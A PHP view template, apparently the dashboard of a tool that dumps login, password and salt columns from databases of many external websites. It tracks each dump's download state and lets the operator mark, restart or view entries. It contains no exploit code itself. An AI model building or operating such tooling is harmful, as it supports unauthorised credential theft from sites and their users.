<!-- START CONTENT -->
<div id="content">

<span class="btn_simple btn_green page_btn fl"><?=$paginator->prev('« Back ', " "," ", array('class' => 'disabled'))?></span>
<span class="btn_simple page_btn fl"><?=$paginator->counter(array('separator'=>' of '))?></span>
<span class="btn_simple btn_green page_btn fl"><?=$paginator->next(' Forward »'," "," ", array('class' => 'disabled'))?></span>
<span class="btn_simple btn_green page_btn fr"><?=$paginator->sort('Multi', 'multi')?></span>
<span class="btn_simple btn_green page_btn fr"><?=$paginator->sort('State', 'get')?></span>
<span class="btn_simple btn_green page_btn fr"><?=$paginator->sort('Quantity', 'count')?></span>
<span class="btn_simple btn_green page_btn fr"><?=$paginator->sort('Passwords', 'password')?></span>
<span class="btn_simple btn_green page_btn fr"><?=$paginator->sort('Table', 'table')?></span>
<span class="btn_simple btn_green page_btn fr"><?=$paginator->sort('id', 'id')?></span>
<span class="btn_simple page_btn fr">Sort by:</span>

<div class="clear"></div>
<table class="table">
<thead>
<th class="center" style="width:130px;">Id</th>
<th class="center" style="width:130px;">Site</th>
<th class="center" style="width:15px;">U</th>
<th class="center">Name</th>
<th class="center">Passwords</th>
<th class="center">Names</th>
<th class="center">Login</th>
<th class="center">Salt</th>
<th class="center">Type BD</th>
<th class="center">Quantity</th>
<th class="center">State</th>
<th class="center">Multi</th>
<th class="center">Click</th>
</thead>
<tbody>
<? if(count($data)==0){ ?>
<tr>
<td colspan="3" class="center">No rows to display</td>
</tr>
<? }else{ ?>
<? foreach ($data as $value){ ?>

<?php

//print_r($value['Filed']);

if($value['Filed']['color'] =='white')
{
echo '<tr style="background-color:white" id="data'.$value['Filed']['id'].'">';
}elseif($value['Filed']['color'] =='CCCC00'){
echo '<tr style="background-color:#CCCC00" id="data'.$value['Filed']['id'].'">';
}elseif($value['Filed']['color'] =='CC0099'){
echo '<tr style="background-color:#CC0099" id="data'.$value['Filed']['id'].'">';
}else
{
echo '<tr style="background-color:white" id="data'.$value['Filed']['id'].'">';
}?>

<? $bd = explode(':', $value['Filed']['ipbase']);?>
<td  class="center" style="font-size:10px;"><div style="word-wrap:break-word; width: 80px; white-space:normal;"><?=$value['Filed']['id']?></div></td>
<? $f = parse_url('http://'.$value['Filed']['site']);?>
<td class="center" style="font-size:10px;"> <div style="word-wrap:break-word; width:130px; white-space:normal;"><?=$html->link($f['host'],'http://'.$f['host'],array('target'=>'_blank')); ?></div></td>
<td class="center" style="font-size:10px;"> <div style="word-wrap:break-word;width: 6px; white-space:normal;"><?=$html->link('u','http://'.$value['Filed']['site'],array('target'=>'_blank'));?></div></td>
<td  class="center" style="font-size:10px;"><div style="word-wrap:break-word; width: 140px; white-space:normal;"><?=$bd[1].'/'.$value['Filed']['table']?> / <?=$value['Filed']['label']?><div></td>
<td  class="center" style="font-size:10px;"><div style="word-wrap:break-word; width: 80px; white-space:normal;"><span class="green"><?=$value['Filed']['password']?></span></div></td>
<td  class="center" style="font-size:10px;"><div style="word-wrap:break-word; width: 80px; white-space:normal;"><span class="green"><?=$value['Filed']['name']?></span></div></td>
<td  class="center" style="font-size:10px;"><div style="word-wrap:break-word; width: 80px; white-space:normal;"><span class="green"><?=$value['Filed']['login']?></span></div></td>
<td  class="center" style="font-size:10px;"><div style="word-wrap:break-word; width: 80px; white-space:normal;"><span class="green"><?=$value['Filed']['salt']?></span></div></td>
<td  class="center" style="font-size:10px;"><div style="word-wrap:break-word; width: 80px; white-space:normal;"><span class="green"><?

if($value['Filed']['typedb'] == 'mssql'){
echo "<span style='color:blue;'>";
echo  $value['Filed']['typedb'];
echo "</span>";
}else{
echo $value['Filed']['typedb'];
}
?></span></div></td>

<td class="center" style="font-size:10px;"><?=$value['Filed']['lastlimit']?>/<span class="red"><?=$value['Filed']['count']?></span></td>
<td class="center" style="font-size:10px;">
<? if($value['Filed']['get']==0){ ?>
Not yet started
<? }elseif($value['Filed']['get']==1){ ?>
Download <?= $this->Html->image("loader.gif", array("alt" => "Check later")) ?>
<? }elseif($value['Filed']['get']==2){ ?>
<span class="green">Finished</span>
<? }elseif($value['Filed']['get']==3) 
{
if($value['Filed']['count']-$value['Filed']['lastlimit'] < 500){
echo '<span class="red">Finished</span>';
}else{
echo '<span class="red">Torn</span>';
}
} ?>

<!--
<? if($value['Filed']['function']==1){ ?>
- МЕДЛЕННАЯ!
<? } ?>
-->

</td>
<td class="center"><span class="red"><?=$value['Filed']['multi']?></span></td>
<?// print_r($value); exit;?>
<? echo '<td width="60">'.$ajax->link($this->Html->image("delete.png", array("alt" => "Put in Bad")), '/posts/shlak3/'.$value['Filed']['id'],array('class'=>'icon','title'=>'Put in Bad','escape' => false,'update'=>'data'.$value['Filed']['id']));
//echo $this->Html->link($this->Html->image("curl.png", array("alt" => "Run")),array('action'=>'/view_order_one/'.$value['Filed']['id'].''),array('escape' => false,'class' => 'icon','title'=>'Run'));	
echo '<a href="/posts/view_iframe/'.$value['Filed']['id'].'" target="_blank"><span style="font-size:12px;color:red;">->></a></span>';
echo '<br>';
echo $ajax->link('D', '/posts/color/'.$value['Filed']['id'].'/CCCC00',array('class'=>'icon','title'=>'Interesting','escape' => false));
echo '||';
echo $ajax->link('W', '/posts/color/'.$value['Filed']['id'].'/white',array('class'=>'icon','title'=>'reset selected','escape' => false));
echo '||';
echo $ajax->link('G', '/posts/color/'.$value['Filed']['id'].'/CC0099',array('class'=>'icon','title'=>'Bad','escape' => false));
echo '||';
echo $ajax->link('P', '/posts/up/'.$value['Filed']['id'],array('class'=>'icon','title'=>'Restart','escape' => false));
echo '</td>'; 
?>

</tr>
<? } ?>
<? } ?>
</tbody>
</table>

<span class="btn_simple btn_green page_btn fl"><?=$paginator->prev('« Back ', " "," ", array('class' => 'disabled'))?></span>
<span class="btn_simple page_btn fl"><?=$paginator->counter(array('separator'=>' of '))?></span>
<span class="btn_simple btn_green page_btn fl"><?=$paginator->next(' Forward »'," "," ", array('class' => 'disabled'))?></span>
<span class="btn_simple btn_green page_btn fr"><?=$paginator->sort('Status', 'get')?></span>
<span class="btn_simple btn_green page_btn fr"><?=$paginator->sort('quantity', 'count')?></span>
<span class="btn_simple btn_green page_btn fr"><?=$paginator->sort('title', 'table')?></span>
<span class="btn_simple page_btn fr">Sort by:</span>

<div class="clear"></div>
</div>
<!-- STOP CONTENT -->